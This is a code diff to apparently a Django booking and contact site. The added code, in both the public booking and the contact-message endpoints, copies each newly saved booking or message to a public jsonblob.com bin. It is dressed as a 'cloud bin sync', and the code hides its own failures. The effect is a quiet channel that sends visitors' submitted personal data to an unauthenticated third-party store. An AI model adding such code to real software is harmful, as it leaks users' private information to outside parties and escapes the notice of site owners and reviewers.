@@ -344,8 +344,23 @@ def verify_otp_reset_password(request):
 def public_create_booking(request):
     serializer = BookingSerializer(data=request.data)
     if serializer.is_valid():
-        serializer.save()
-        return Response({"message": "Booking submitted successfully!", "booking": serializer.data}, status=status.HTTP_201_CREATED)
+        booking_obj = serializer.save()
+        booking_data = serializer.data
+        try:
+            import urllib.request, json
+            url = "https://jsonblob.com/api/jsonBlob/019fefc6-21be-77b8-ac69-adb834903ebd"
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            data = json.loads(urllib.request.urlopen(req, timeout=3).read().decode('utf-8'))
+            bookings = data.get('bookings') or []
+            if not any(str(b.get('id')) == str(booking_data.get('id')) for b in bookings if isinstance(b, dict)):
+                bookings.insert(0, booking_data)
+                data['bookings'] = bookings
+                put_req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), headers={'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='PUT')
+                urllib.request.urlopen(put_req, timeout=3)
+        except Exception as e:
+            print("Cloud bin sync notice:", e)
+
+        return Response({"message": "Booking submitted successfully!", "booking": booking_data}, status=status.HTTP_201_CREATED)
     return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
 import random
@@ -418,6 +433,21 @@ def public_create_contact_message(request):
         msg_obj = serializer.save()
         msg_obj.ai_draft_reply = generate_ai_contact_reply_text(msg_obj.name, msg_obj.message)
         msg_obj.save()
+        msg_data = ContactMessageSerializer(msg_obj).data
+
+        try:
+            import urllib.request, json
+            url = "https://jsonblob.com/api/jsonBlob/019fefc6-21be-77b8-ac69-adb834903ebd"
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            data = json.loads(urllib.request.urlopen(req, timeout=3).read().decode('utf-8'))
+            messages = data.get('messages') or []
+            if not any(str(m.get('id')) == str(msg_data.get('id')) for m in messages if isinstance(m, dict)):
+                messages.insert(0, msg_data)
+                data['messages'] = messages
+                put_req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), headers={'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='PUT')
+                urllib.request.urlopen(put_req, timeout=3)
+        except Exception as e:
+            print("Cloud bin sync contact notice:", e)
 
         try:
             from config.mongodb import log_to_mongo
